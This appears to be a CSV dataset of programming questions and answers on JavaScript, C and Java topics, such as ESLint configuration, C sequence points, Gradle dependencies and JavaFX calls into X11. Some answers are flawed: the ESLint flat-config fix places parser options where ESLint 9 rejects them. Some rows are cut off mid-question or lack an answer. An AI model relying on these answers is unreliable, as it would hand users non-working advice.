instruction,input,output,Categories
eslint prettier parsing error unexpected token with,"I am fairly new to ESLint, Prettier, and Babel; still learning how they work together.  I am using Visual Studio Code 1.96.4, with ESLint and Prettier extensions.
In one of my javascript files, I have an import statement with a type assertion.  For example:
import * as manifest from './package.json' with { type: 'json' };
                                           ~~~~

My IDE is telling me that ESLint has an issue with the above import statement:
Parsing error: Unexpected token with | eslint

I have an eslint.config.js file, which exports an eslint.Linter.Config array that specifies my own config object (which has language options and rules), followed by a recommended config from @eslint/js, and the ESLint Prettier plugin recommended config.
import pluginJs from '@eslint/js';
import eslintPluginPrettier from 'eslint-plugin-prettier/recommended';
import globals from 'globals';

/** @type {import('eslint').Linter.Config[]} */
export default [
  {
    languageOptions: {
      globals: {
        ...globals.browser,
        ...globals.jest
      },
      ecmaVersion: 2024,
      sourceType: 'module'
    },
    rules: {
      ...
    }
  },
  pluginJs.configs.recommended,
  eslintPluginPrettier    // <-- Removing this fixes the problem, but then am I still running Prettier at lint-time?
];

These are the installed packages that (I think?) are relevant:
""devDependencies"": {
  ""@babel/core"": ""^7.26.0"",
  ""@babel/eslint-parser"": ""^7.26.5"",
  ""@babel/plugin-syntax-import-assertions"": ""^7.26.0"",
  ...
  ""@eslint/eslintrc"": ""^3.2.0"",
  ""@eslint/js"": ""^9.18.0"",
  ...
  ""eslint"": ""^9.18.0"",
  ""eslint-config-prettier"": ""^10.0.1"",
  ""eslint-plugin-prettier"": ""^5.2.3"",
  ...
  ""prettier"": ""^3.4.2"",
  ...
},

I also have a .prettierrc file that is a simple JSON object with only rules in it, no plugins or anything.  And I don't know if .babelrc has anything to do with this?
How can I make the IDE error go away, while still enforcing both ESLint and Prettier rules?
","You've already installed @babel/plugin-syntax-import-assertions, but you also need to make ESLint use @babel/eslint-parser with the correct configuration:
import pluginJs from '@eslint/js';
import eslintPluginPrettier from 'eslint-plugin-prettier/recommended';
import globals from 'globals';

/** @type {import('eslint').Linter.Config[]} */
export default [
  {
    parser: '@babel/eslint-parser',  // Set Babel as the parser
    parserOptions: {
      requireConfigFile: false,  // Prevents needing a separate Babel config file
      babelOptions: {
        plugins: ['@babel/plugin-syntax-import-assertions'],  // Ensure the plugin is enabled
      },
    },
    languageOptions: {
      globals: {
        ...globals.browser,
        ...globals.jest,
      },
      ecmaVersion: 2024,
      sourceType: 'module',
    },
    rules: {
      // Your custom rules
    },
  },
  pluginJs.configs.recommended,
  eslintPluginPrettier,  // Ensures Prettier runs as well
];

",javascript
what happens if you call free on non allocated memory returned by a function,"I am writing some random code and I wanted to know if there is there anything that defines how freeing memory returned like this works or if it is just undefined behavior.
struct a *get()
{
    static struct a value;

    return &value;
}

","From free() documentation:

If ptr is a null pointer, the function does nothing.
The behavior is undefined if the value of ptr does not equal a value
returned earlier by malloc(), calloc(), realloc(), or aligned_alloc()

I.e. if you free the return value from your get function (which is not a null pointer), you invoke undefined behavior, as it is not a value returned from malloc or similar.
",c
sequence points in c,"
A sequence point in imperative programming defines any point in a computer program's execution at which it is guaranteed that all side effects of previous evaluations will have been performed, and no side effects from subsequent evaluations have yet been performed.

What does this mean? Can somebody please explain it in simple words?
","When a sequence point occurs, it basically means that you are guaranteed that all previous operations are complete.
Changing a variable twice without an intervening sequence point is one example of undefined behaviour.
For example, i = i++; is undefined because there's no sequence point between the two changes to i.
Note that it's not just changing a variable twice that can cause a problem. It's actually a change involved with any other use. The standard uses the term ""value computation and side effect"" when discussing how things are sequenced. For example, in the expression a = i + i++, the i (value computation) and i++ (side effect) may be done in arbitrary order.
Wikipedia has a list of the sequence points in the C and C++ standards although the definitive list should always be taken from the ISO standard. From C11 appendix C (paraphrased):

The following are the sequence points described in the standard:

Between the evaluations of the function designator and actual arguments in a function call and the actual call;
Between the evaluations of the first and second operands of the operators &&, ||, and ,;
Between the evaluations of the first operand of the conditional ?: operator and whichever of the second and third operands is evaluated;
The end of a full declarator;
Between the evaluation of a full expression and the next full expression to be evaluated. The following are full expressions:

an initializer;
the expression in an expression statement;
the controlling expression of a selection statement (if or switch);
the controlling expression of a while or do statement;
each of the expressions of a for statement;
the expression in a return statement.


Immediately before a library function returns;
After the actions associated with each formatted input/output function conversion specifier;
Immediately before and immediately after each call to a comparison function, and also between any call to a comparison function and any movement of the objects passed as arguments to that call.

",c
expo camera cannot read property 39type39 of undefined,"import React, { useState, useEffect, useRef } from 'react';
import { SafeAreaView, View, Text, TouchableOpacity, StyleSheet } from 'react-native';
import { Camera } from 'expo-camera';

export default function HomePage() {
  const [hasCameraPermission, setHasCameraPermission] = useState(null);
  const cameraRef = useRef(null);

  useEffect(() => {
    (async () => {
      const { status } = await Camera.requestCameraPermissionsAsync();
      setHasCameraPermission(status === 'granted');
    })();
  }, []);

  const requestPermission = async () => {
    const { status } = await Camera.requestCameraPermissionsAsync();
    setHasCameraPermission(status === 'granted');
  };

  const takePicture = async () => {
    if (cameraRef.current) {
      try {
        const { uri } = await cameraRef.current.takePictureAsync();
        console.log('Picture taken:', uri);
      } catch (error) {
        console.error('Error taking picture:', error);
      }
    }
  };

  return (
    <SafeAreaView style={styles.container}>
      <View style={styles.cameraContainer}>
        {hasCameraPermission === null ? (
          <Text>Waiting for camera permission...</Text>
        ) : hasCameraPermission === false ? (
          <Text>Camera permission denied.</Text>
        ) : (
          <Camera
            style={styles.camera}
            type={Camera.Constants.Type.back}
            ref={cameraRef}
          />
        )}
      </View>
      <View style={styles.buttonContainer}>
        <TouchableOpacity style={styles.button} onPress={requestPermission}>
          <Text style={styles.buttonText}>Allow Permission</Text>
        </TouchableOpacity>
        <TouchableOpacity style={styles.button} onPress={takePicture}>
          <Text style={styles.buttonText}>Take Picture</Text>
        </TouchableOpacity>
      </View>
    </SafeAreaView>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#f0f0f0',
  },
  cameraContainer: {
    width: '100%',
    height: '70%',
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: 'black',
  },
  camera: {
    width: '100%',
    height: '100%',
  },
  buttonContainer: {
    flexDirection: 'row',
    justifyContent: 'space-around',
    alignItems: 'center',
    width: '100%',
    marginTop: 20,
  },
  button: {
    backgroundColor: '#3ABEF9',
    paddingVertical: 15,
    paddingHorizontal: 30,
    borderRadius: 10,
  },
  buttonText: {
    color: 'white',
    fontWeight: 'bold',
    fontSize: 16,
  },
});


app.json
{
  ""expo"": {
    ""name"": ""k"",
    ""slug"": ""k"",
    ""version"": ""1.0.0"",
    ""orientation"": ""portrait"",
    ""icon"": ""./assets/icon.png"",
    ""userInterfaceStyle"": ""light"",
    ""splash"": {
      ""image"": ""./assets/splash.png"",
      ""resizeMode"": ""contain"",
      ""backgroundColor"": ""#ffffff""
    },
    ""plugins"": [
      [
        ""expo-camera"",
        {
          ""cameraPermission"": ""Allow $(PRODUCT_NAME) to access your camera.""
        }
      ]
    ],
    ""ios"": {
      ""supportsTablet"": true
    },
    ""android"": {
      ""adaptiveIcon"": {
        ""foregroundImage"": ""./assets/adaptive-icon.png"",
        ""backgroundColor"": ""#ffffff""
      }
    },
    ""web"": {
      ""favicon"": ""./assets/favicon.png""
    }
  }
}


In this code i see the ""TypeError: Cannot read property 'Type' of undefined
This error is located at:
in HomePage (created by App)
in App (created by withDevTools(App))
in withDevTools(App)
in RCTView (created by View)
in View (created by AppContainer)
in RCTView (created by View)
in View (created by AppContainer)
in AppContainer
in main(RootComponent), js engine: hermes"" this error
","You used Camera.Constants.Type.back for type prop. Please import CameraType as I’ve shown below and check it:
import { Camera, CameraType } from 'expo-camera/legacy';
.
.
.
const [type, setType] = useState(CameraType.back);

And then use type state for type prop in <Camera>.
",javascript
build fails in gradle multiproject build due to dependency which is not used,"I am working on a Gradle multi-project that is what's happening:
Dependency X is used and declared in subproject A.
Subproject B depends on subproject A.
Build fails, because dependency X is missing in subproject B.
Edit I: Why does the build fail? Only A should need the dependency. This is the error message on :subprojectB:compileJava, where SomeClass comes from X.
C:\...\ClassSubpojectB.java:86: error: cannot access SomeClass
      //some code
                          ^
  class file for SomeClass not found
1 error

FAILURE: Build failed with an exception.

* What went wrong:
Execution failed for task ':subprojectB:compileJava'.
> Compilation failed; see the compiler error output for details.

* Try:
> Run with --stacktrace option to get the stack trace.
> Run with --info or --debug option to get more log output.
> Run with --scan to get full insights.

* Get more help at https://help.gradle.org

BUILD FAILED in 1m 53s

Edit II: Dao.get is marked red in my IDE.
Bla bla = Dao.get(Bla .class, new Key(""id"", id));

with
  public static <O> O get(Class<O> c, Key key) {
    SomeClass s = key.getSomeClass();
    return get(c, s);
  }

SomeClass is only used in the body of get, so it should not be exposed. I that not correct?
","It looks like what's happening is that, on line 86 of ClassSubpojectB.java within subproject B, you call a method of a class in subproject A and that method returns a type from dependency X (namely SomeClass). Edit: Based on further information, it looks like one of the parameter types of that method (Key) exposes SomeClass as a return type on one of its methods.
Such a method call will cause the compilation of subproject B to fail. See eg this Gradle documentation for further details.
To fix, either:

change dependency X from an implementation dependency to an api dependency in subproject A (which requires applying the Java Library plugin in A if you've not done so already),
declare X as an implementation dependency in subproject B, or
refactor the API of A so that it does not expose any types from X, perhaps ""wrapping"" X types with your own.

",java
getting quotreobserveasconcast is not a functionquot error after updating to apollo client 3120,"I recently updated my Apollo Client version from 3.5.8 to 3.12.0, and now I'm encountering an error when using the useLazyQuery hook. The error states:
observable.reobserveAsConcast is not a function

This error appears to be triggered within the executeQuery function, which is used internally by useLazyQuery. Here's is the code: https://github.com/apollographql/apollo-client/blob/6ffb5a34a39657568db7f4e42ed60d8679cb817f/src/react/hooks/useLazyQuery.ts#L222
I'm using useLazyQuery like this:
const [
    fetchData,
    { data, loading: isLoading, error: fetchError },
] = useLazyQuery(SOME_QUERY, {
    fetchPolicy: ""no-cache"",
});

The error occurs whenever I trigger the fetchData function.
I also updated react from version 17 to 18
Are there any changes in how useLazyQuery or ObservableQuery should be used in Apollo Client 3.12.0?
I would greatly appreciate any guidance or insights into resolving this issue. Thank you!
","
Are there any changes in how useLazyQuery or ObservableQuery should be used in Apollo Client 3.12.0?

No, there are no such changes, and no changes that should cause this behaviour.
If I were to guess I would say that you might be combining a modern version of the hook with an outdated instance of ApolloClient here - check your node_modules folder and maybe yarn why @apollo/client/npm ls @apollo/client if by any chance you have more than one version of Apollo Client installed.
",javascript
assets folder in android studio unit test,"I have a Gradle project with the following structure:
project/
    src/
        androidTest/
            java/
        main/
            java/
            res/
            AndroidManifest.xml
    build.gradle

Now I want to add a unit test which uses a resource (either ""raw"" or ""asset""). 
I put my resource into project/androidTest/assets/test_file and access it with getContext().getResources().getAssets().open(""test_file""); (in an AndroidTestCase).
However, this gives me a FileNotFoundException. How can I fix this?
","It looks like you're trying to create an instrumented unit test, since you want to create it in the androidTest folder.
You can use one of these two options in your test to get the context:

Context ctx = InstrumentationRegistry.getTargetContext();
this one will give you your app's context. You can use it to grab assets that are in src/main/assets for example.

Context ctx = InstrumentationRegistry.getContext();
this one will give you the test app's context. You can use it to grab assets that are in src/androidTest/assets


If you want to know more about assets in unit testing you can read this post. In this github file you have an example.
Deprecation Note: As pointed out in the comments, these methods are now deprecated. This is the new recommended way:

First, instead of importing the old InstrumentationRegistry class, use the new one.
Instead of InstrumentationRegistry.getTargetContext(); use ApplicationProvider.getApplicationContext(). Source
Instead of InstrumentationRegistry.getTargetContext(); use ApplicationProvider.getApplicationContext(). Source
For InstrumentationRegistry.getTargetContext();: In most scenarios, ApplicationProvider.getApplicationContext() should be used instead of the instrumentation test context. If you do need access to the test context for to access its resources, it is recommended to use PackageManager.getResourcesForApplication(String) instead.
Source

",java
gnu riscv embedded gcc throws quotx isa extension xw39 must be set with the versionsquot error,"I can build the c-files from my WCH CH32V003F4P6 microcontroller project with the GNU RISC-V Embedded GCC v8.2.0 toolchain shipped with the Eclipse IDE from WCH (MounRiver Studio). However, if I try to build the same c-files with a similar toolchain downloaded here (see https://xpack.github.io/dev-tools/riscv-none-elf-gcc/releases/), then I get incomprehensible errors like:
Error: x ISA extension 'xw' must be set with the versions
or
cc1.exe: error: -march=rv32ecxw: unsupported ISA substring 'xw'
Reproduce the problem
To reproduce the problem, you should:

First install MounRiver Studio (see http://www.mounriver.com/download)

Second, download the microcontroller sample projects from http://www.wch-ic.com/products/CH32V003.html (see the CH32V003EVT.ZIP file at the bottom of the webpage). Unzip it to your C:/ drive. The GPIO_Toggle sample project is now at ""C:/CH32V003EVT/EVT/EXAM/GPIO/GPIO_Toggle/"".


Let's now compile the main.c file from the GPIO_Toggle project, like this:
> ""C:/MounRiver/MounRiver_Studio/toolchain/RISC-V Embedded GCC/bin/riscv-none-embed-gcc""
    -march=rv32ecxw
    -mabi=ilp32e
    -msmall-data-limit=0
    -msave-restore
    -fsigned-char
    -fno-common
    -Wunused
    -Wuninitialized
    -Og
    -g3
    -fmessage-length=0
    -ffunction-sections
    -fdata-sections
    -Wno-comment
    -Wno-unused-function
    -std=gnu99
    -Werror-implicit-function-declaration
    -I""C:/CH32V003EVT/EVT/EXAM/SRC/Core""
    -I""C:/CH32V003EVT/EVT/EXAM/SRC/Debug""
    -I""C:/CH32V003EVT/EVT/EXAM/SRC/Peripheral/inc""
    -I""C:/CH32V003EVT/EVT/EXAM/GPIO/GPIO_Toggle/User""
    ""C:/CH32V003EVT/EVT/EXAM/GPIO/GPIO_Toggle/User/main.c""
    -o ""C:/CH32V003EVT/EVT/EXAM/GPIO/GPIO_Toggle/build/main.o""
    -c

This should work.
Let's try with a few other toolchains. Download some GNU RISC-V Embedded GCC toolchains from here: https://xpack.github.io/dev-tools/riscv-none-elf-gcc/releases/
Unzip them to your C:/ drive:

Now invoke the same compilation command with each of these toolchains:
> ""C:/xpack-riscv-none-embed-gcc-8.2.0-3.1-win32-x32/bin/riscv-none-embed-gcc""
    -march=rv32ecxw
    -mabi=ilp32e
    -...

> ""C:/xpack-riscv-none-embed-gcc-8.2.0-3.1-win32-x64/bin/riscv-none-embed-gcc""
    -march=rv32ecxw
    -mabi=ilp32e
    -...

> ""C:/xpack-riscv-none-elf-gcc-12.2.0-3-win32-x64/bin/riscv-none-elf-gcc""
    -march=rv32ecxw
    -mabi=ilp32e
    -...

I got these obscure errors:

Error: x ISA extension 'xw' must be set with the versions

cc1.exe: error: -march=rv32ecxw: unsupported ISA substring 'xw'


I can't wrap my head around them.
Compare the toolchains
As a first reaction, I compare the toolchains. The one from MounRiver Studio outputs the following for --version:
> ""C:/MounRiver/MounRiver_Studio/toolchain/RISC-V Embedded GCC/bin/riscv-none-embed-gcc"" --version
riscv-none-embed-gcc (xPack GNU RISC-V Embedded GCC, 32-bit) 8.2.0
Copyright (C) 2018 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

I get the exact same output from one of the other toolchains:
> ""C:/xpack-riscv-none-embed-gcc-8.2.0-3.1-win32-x32/bin/riscv-none-embed-gcc"" --version
riscv-none-embed-gcc (xPack GNU RISC-V Embedded GCC, 32-bit) 8.2.0
Copyright (C) 2018 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

So they must be identical, no? How then is it possible that the one from MounRiver works and the other one doesn't?
","The xPack GNU RISC-V Embedded GCC supports only the standard RISC-V extensions. The 'xw' extension is custom one, added by WCH for their own designs, and is supported only by their custom toolchain.
",c
how to change the look and feel in netbeans gui designer preview,"When using the NetBeans GUI Builder the ""Preview Design"" feature shows the panel with the system look and feel (e.g. Windows). Now I want to preview my panel with a different LaF to get all the gaps and spaces right. Is there a way to tell the gui builder to display the panel with a different LaF?
","The only thing I can find is: 
Inspector > Right click on your JFrame > Preview Design

",java
how to manage taskbar from javafx via native code in linux,"I'm trying get more experience with the new Foreign Function & Memory API in Java 22+. The best way
how to learn a new API is by using it in a project.
My project’s goal is to report on the taskbar the progress of some long-running task.
As far as I know, there is no ""native"" support of this in JavaFX.
There are some libraries like
FXTaskbarProgressBar which serves the
purpose, but only for Windows OS. And it is using the ""old"" Java Native Interface (JNI).
After a short research, I found a simple Go library
taskbar. This library inspired me to try porting to Java for JavaFX.
First I used jextract to get java bindings to native library calls:
jextract --output target/generated-sources/jextract -t ""taskbar_test.gen"" --include-function ""XOpenDisplay"" --include-function ""XChangeProperty"" --include-function ""XFlush"" --include-function ""XCloseDisplay"" /usr/include/X11/Xlib.h

Then I created a simple application to simulate long running process
where I try to update progress on taskbar by calling method
""XChangeProperty"" which I found in documentation of X11:
https://www.x.org/releases/X11R7.7/doc/libX11/libX11/libX11.html#XChangeProperty
Unfortunately this does not work. The program does not crash,
task is running on background, but no update on taskbar is happening.
Here is the code I created:
package taskbar_test;

import com.sun.glass.ui.Window;
import javafx.application.Application;
import javafx.concurrent.Task;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.layout.VBox;
import javafx.stage.Stage;
import taskbar_test.gen.Xlib_h;

import java.lang.foreign.Arena;
import java.lang.foreign.MemorySegment;
import java.lang.foreign.ValueLayout;


public class AppLinuxXlib extends Application {

    @Override
    public void start(Stage primaryStage) {
        Button startButton = new Button(""Start Long Running Task"");

        startButton.setOnAction(event -> {
            final long rawHandle = Window.getWindows().getFirst().getRawHandle();
            System.out.println(rawHandle);
            // Create a long-running task
            Task<Void> longTask = new Task<>() {
                @Override
                protected Void call() throws Exception {
                    System.out.println(""Started"");

                    try (var arena = Arena.ofConfined()) {
                        var NET_WM_XAPP_PROGRESS = arena.allocateFrom(""NET_WM_XAPP_PROGRESS"");
//                        var NET_WM_XAPP_PROGRESS_PULSE = arena.allocateFrom(""NET_WM_XAPP_PROGRESS_PULSE"");

                        MemorySegment x11Session = Xlib_h.XOpenDisplay(MemorySegment.NULL);
                        System.out.println(x11Session);

                        // Prepare the progress data
                        MemorySegment initData = arena.allocateFrom(ValueLayout.JAVA_INT, 0);
                        Xlib_h.XChangeProperty(x11Session,                    // display
                                MemorySegment.ofAddress(rawHandle).address(), // window
                                NET_WM_XAPP_PROGRESS.address(),               // property
                                6,                                            // type
                                32,                                           // format
                                0,                                            // mode PropModeReplace=0
                                initData,                                     // data
                                1);                                           // nelements
                        Xlib_h.XFlush(x11Session);

                        System.out.println(""Countdown started"");

                        // Set the taskbar progress
                        for (int i = 0; i <= 100; i+=20) {
                            // Simulate work
                            Thread.sleep(500);
                            System.out.println(i);
                            MemorySegment progressData = arena.allocateFrom(ValueLayout.JAVA_INT, i);
                            // Update taskbar progress
                            // https://www.x.org/releases/X11R7.7/doc/libX11/libX11/libX11.html#XChangeProperty
                            Xlib_h.XChangeProperty(x11Session,                    // display
                                    MemorySegment.ofAddress(rawHandle).address(), // window
                                    NET_WM_XAPP_PROGRESS.address(),               // property
                                    6,                                            // type
                                    32,                                           // format
                                    0,                                            // mode PropModeReplace=0
                                    progressData,                                 // data
                                    1);                                           // nelements
                            Xlib_h.XFlush(x11Session);
                        }
                        System.out.println(""Finished"");
                        Xlib_h.XCloseDisplay(x11Session);

                    } catch (Throwable ex) {
                        ex.printStackTrace();
                    }
                    return null;
                }
            };

            // Start the task in a new thread
            new Thread(longTask).start();
        });

        VBox vbox = new VBox(10, startButton);
        Scene scene = new Scene(vbox, 300, 200);
        primaryStage.setScene(scene);
        primaryStage.setTitle(""Taskbar Progress Example Linux"");
        primaryStage.show();
    }

    public static void main(String[] args) {
        launch(args);
    }
}

Can someone show me what am I doing wrong and maybe point me to the correct
direction with how to make the implementation work?
Thank you very much.
Petr
","I wasn’t able to solve this, but I suspect it’s because I am running Gnome 43.9 Classic, and I’m not sure it supports showing progress in taskbar buttons.  But I can provide some advice, at least:

The Window type in X is not a pointer or address.  It is an XID, which is usually a 32-bit integer.
The property argument is an Atom, which is also an XID, not an address or pointer.  An Atom must be obtained by passing the atom’s string name to XInternAtom.
The name of the Atom, from what I can gather, starts with an underscore:  _NET_WM_XAPP_PROGRESS  (I don’t understand why there is so little documentation about this property on the web.)

With those things in mind, I changed your code to this.  (I replaced the taskbar_test.gen.Xlib_h package with explicit calls to java.lang.foreign.)
import com.sun.glass.ui.Window;

import javafx.application.Application;
import javafx.concurrent.Task;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.layout.VBox;
import javafx.stage.Stage;

import java.lang.invoke.MethodHandle;

import java.lang.foreign.Arena;
import java.lang.foreign.MemorySegment;
import java.lang.foreign.ValueLayout;
import java.lang.foreign.Linker;
import java.lang.foreign.SymbolLookup;
import java.lang.foreign.FunctionDescriptor;

public class AppLinuxXlib extends Application {
    private static final int None = 0;              // from X.h
    private static final int False = 0;             // from Xlib.h
    private static final int PropModeReplace = 0;   // from X.h

    private static final int XA_CARDINAL = 6;       // from Xatom.h

    private MethodHandle XOpenDisplay;
    private MethodHandle XCloseDisplay;
    private MethodHandle XInternAtom;
    private MethodHandle XChangeProperty;
    private MethodHandle XFlush;

    @Override
    public void init()
    throws Exception {
        Linker linker = Linker.nativeLinker();
        SymbolLookup lookup = SymbolLookup.loaderLookup();

        XOpenDisplay = linker.downcallHandle(
            lookup.findOrThrow(""XOpenDisplay""),
            FunctionDescriptor.of(
                ValueLayout.ADDRESS,                            // returns Display *
                ValueLayout.ADDRESS.withName(""display_name"")    // char *display_name
            ));
        XCloseDisplay = linker.downcallHandle(
            lookup.findOrThrow(""XCloseDisplay""),
            FunctionDescriptor.of(
                ValueLayout.JAVA_INT,                           // returns int
                ValueLayout.ADDRESS.withName(""display"")         // Display *display
            ));
        XInternAtom = linker.downcallHandle(
            lookup.findOrThrow(""XInternAtom""),
            FunctionDescriptor.of(
                ValueLayout.JAVA_INT,                            // returns Atom
                ValueLayout.ADDRESS.withName(""display""),         // Display *display
                ValueLayout.ADDRESS.withName(""atom_name""),       // char *atom_name
                ValueLayout.JAVA_INT.withName(""only_if_exists"")  // Bool only_if_exists
            ));
        XChangeProperty = linker.downcallHandle(
            lookup.findOrThrow(""XChangeProperty""),
            FunctionDescriptor.of(
                ValueLayout.JAVA_INT,                       // returns int
                ValueLayout.ADDRESS.withName(""display""),    // Display *display
                ValueLayout.JAVA_INT.withName(""w""),         // Window w
                ValueLayout.JAVA_INT.withName(""property""),  // Atom property
                ValueLayout.JAVA_INT.withName(""type""),      // Atom type
                ValueLayout.JAVA_INT.withName(""format""),    // int format
                ValueLayout.JAVA_INT.withName(""mode""),      // int mode
                ValueLayout.ADDRESS.withName(""data""),       // char *data
                ValueLayout.JAVA_INT.withName(""nelements"")  // int nelements
            ));
        XFlush = linker.downcallHandle(
            lookup.findOrThrow(""XFlush""),
            FunctionDescriptor.of(
                ValueLayout.JAVA_INT,                   // returns int
                ValueLayout.ADDRESS.withName(""display"") // Display *display
            ));
    }

    private MemorySegment XOpenDisplay(MemorySegment display)
    throws Throwable {
        return (MemorySegment) XOpenDisplay.invokeExact(display);
    }

    private int XCloseDisplay(MemorySegment display)
    throws Throwable {
        return (int) XCloseDisplay.invokeExact(display);
    }

    private int XInternAtom(MemorySegment display,
                            MemorySegment atomName,
                            int onlyIfExists)
    throws Throwable {
        return (int) XInternAtom.invokeExact(display, atomName, onlyIfExists);
    }

    private int XFlush(MemorySegment display)
    throws Throwable {
        return (int) XFlush.invokeExact(display);
    }

    private int XChangeProperty(MemorySegment display,
                                int window,
                                int property,
                                int type,
                                int format,
                                int mode,
                                MemorySegment data,
                                int dataLen)
    throws Throwable {
        return (int) XChangeProperty.invokeExact(display,
            window, property, type, format, mode, data, dataLen);
    }

    @Override
    public void start(Stage primaryStage) {
        Button startButton = new Button(""Start Long Running Task"");

        startButton.setOnAction(event -> {
            final int window = (int) Window.getWindows().getFirst().getNativeWindow();
            System.out.printf(""Window=%#x%n"", window);
            // Create a long-running task
            Task<Void> longTask = new Task<>() {
                @Override
                protected Void call() throws Exception {
                    System.out.println(""Started"");

                    try (var arena = Arena.ofConfined()) {
                        MemorySegment x11Session = XOpenDisplay(MemorySegment.NULL);
                        System.out.println(""display="" + x11Session);

                        var name = arena.allocateFrom(""_NET_WM_XAPP_PROGRESS"");
                        var NET_WM_XAPP_PROGRESS = XInternAtom(x11Session, name, 0);
                        if (NET_WM_XAPP_PROGRESS == None) {
                            throw new RuntimeException(""XInternAtom failed."");
                        }
//                        var NET_WM_XAPP_PROGRESS_PULSE = arena.allocateFrom(""NET_WM_XAPP_PROGRESS_PULSE"");

                        // Prepare the progress data
                        MemorySegment progressData = arena.allocateFrom(ValueLayout.JAVA_INT, 0);
                        int status = XChangeProperty(
                                x11Session,                                   // display
                                window,                                       // window
                                NET_WM_XAPP_PROGRESS,                         // property
                                XA_CARDINAL,                                  // type
                                32,                                           // format
                                PropModeReplace,                              // mode
                                progressData,                                 // data
                                1);                                           // nelements
                        if (status == False) {
                            throw new RuntimeException(""XChangeProperty returned "" + status);
                                    
                        }

                        status = XFlush(x11Session);
                        if (status == False) {
                            throw new RuntimeException(""XFlush returned "" + status);
                        }

                        System.out.println(""Countdown started"");

                        // Set the taskbar progress
                        for (int i = 0; i <= 100; i+=20) {
                            // Simulate work
                            Thread.sleep(500);
                            System.out.println(i);
                            progressData.set(ValueLayout.JAVA_INT, 0, i);
                            // Update taskbar progress
                            // https://www.x.org/releases/X11R7.7/doc/libX11/libX11/libX11.html#XChangeProperty
                            status = XChangeProperty(
                                    x11Session,                                   // display
                                    window,                                       // window
                                    NET_WM_XAPP_PROGRESS,                         // property
                                    XA_CARDINAL,                                  // type
                                    32,                                           // format
                                    PropModeReplace,                              // mode
                                    progressData,                                 // data
                                    1);                                           // nelements
                            if (status == False) {
                                throw new RuntimeException(""XChangeProperty returned "" + status);
                            }

                            status = XFlush(x11Session);
                            if (status == False) {
                                throw new RuntimeException(""XFlush returned "" + status);
                            }
                        }
                        System.out.println(""Finished"");
                        XCloseDisplay(x11Session);

                    } catch (Throwable ex) {
                        ex.printStackTrace();
                    }
                    return null;
                }
            };

            // Start the task in a new thread
            new Thread(longTask).start();
        });

        VBox vbox = new VBox(10, startButton);
        Scene scene = new Scene(vbox, 300, 200);
        primaryStage.setScene(scene);
        primaryStage.setTitle(""Taskbar Progress Example Linux"");
        primaryStage.show();
    }

    public static void main(String[] args) {
        launch(args);
    }
}

This runs, but has no visual effect on my system.  I don’t know if that’s because my version of Gnome doesn’t support it.  I also tried using the xprop program to set the same window property, and that too had no effect.
",java
return value of sizeof operator in c amp c,"#include<stdio.h>
int main()
{
    printf(""%d"", sizeof('a'));
    return 0;
}

Why does the above code produce different results when compiling in C and C++ ?
In C, it prints 4 while in C++, it is the more acceptable answer i.e. 1.
When I replace the 'a' inside sizeof() with a char variable declared in main function, the result is 1 in both cases!
","Because, and this might be shocking, C and C++ are not the same language.
C defines character literals as having type int, while C++ considers them to have type char.
This is a case where multi-character constants can be useful:
const int foo = 'foo';

That will generate an integer whose value will probably be 6713199 or 7303014 depending on the byte-ordering and the compiler's mood. In other words, multiple-character character literals are not ""portable"", you cannot depend on the resulting value being easy to predict.
As commenters have pointed out (thanks!) this is valid in both C and C++, it seems C++ makes multi-character character literals a different type. Clever!
Also, as a minor note that I like to mention when on topic, note that sizeof is not a function and that values of size_t are not int. Thus:
printf(""the size of a character is %zu\n"", sizeof 'a');

or, if your compiler is too old not to support C99:
printf(""the size of a character is %lu\n"", (unsigned long) sizeof 'a');

represent the simplest and most correct way to print the sizes you're investigating.
",c
extract contents of pkg file in java,"I have been trying to unpack a .pkg file, which contains two folders and a .json file, into a directory using Java. I have used the apache.commons.compress library in the past, but unable to use it for the .pkg file. Please let me know how i can do this.
Many thanks
","Managed to unpack. The .pkg file was actually a .cpio payload file with some header and tail bytes.
",java
how to force gcc to do printf checks on nonliteral format strings,"const char* const non_literal_string = ""Hello %d"";

void my_print()
{
    /* 
     * I would like GCC to throw a warning when compiling this line because the
     * argument is not of int type.
     */
    printf(non_literal_string, ""World!"");
    
    //Like it does here
    printf(""Hello %d"", ""World!"");
}

Above I have declared non_literal_string as const char* const so neither the pointer nor the pointed string can change, so there are the conditions for which GCC can check that the supplied arguments have types appropriate to the specified format string.
With clang compiler these checks are performed even on non-literal format strings, this is the output if I try to compile this code with clang:
<source>:11:32: warning: format specifies type 'int' but the argument has type 'char *' [-Wformat]
   11 |     printf(non_literal_string, ""World!"");
      |            ~~~~~~~~~~~~~~~~~~  ^~~~~~~~
<source>:3:47: note: format string is defined here
    3 | const char* const non_literal_string = ""Hello %d"";
      |                                               ^~
      |                                               %s
<source>:14:24: warning: format specifies type 'int' but the argument has type 'char *' [-Wformat]
   14 |     printf(""Hello %d"", ""World!"");
      |                   ~~   ^~~~~~~~
      |                   %s

","
How to force gcc to do printf checks on non-literal format strings?

A program does not do something that you would want the program to do. The only possible way to ""force"" gcc to do anything is to change it. You can modify gcc source code to do the check and implement it. You could post it as a bug or feature request to gcc bugzilla and also fund gcc development https://gcc.gnu.org/wiki/GNUToolchainFund .
The feature is just not implemented, it's not there. There is no ""forcing"".
",c
different way of showing and hiding certain elements,"I made a javascript aim train app that contains a menu. When I click play, I
","Example:
var startBtn = document.getElementById(""comecar"");

Is currently hidden with
startBtn.style.visibility = ""hidden"";

Try this instead:
$(""#comecar"").hide();

and to show it:
$(""#comecar"").show();

You can also chain elements together to hide them all in one line, like so:
$(""#element1, #element2, #element3, #element4"").hide();

Remove all of the visibility assignments.  That leaves the HTML element in place and masks the content, whereas the jQuery hiding removes the element
",javascript
javafx layout children in custom layout component,"I am trying to render a lot of nodes and after a certain amount, scrolling becomes very slow.
Therefore, I'm using a virtualisation approach, similar to TableView. As I have complex layout requirements (e.g. some nodes can be next to others, some need to stay on their own line), TableView is not suitable.
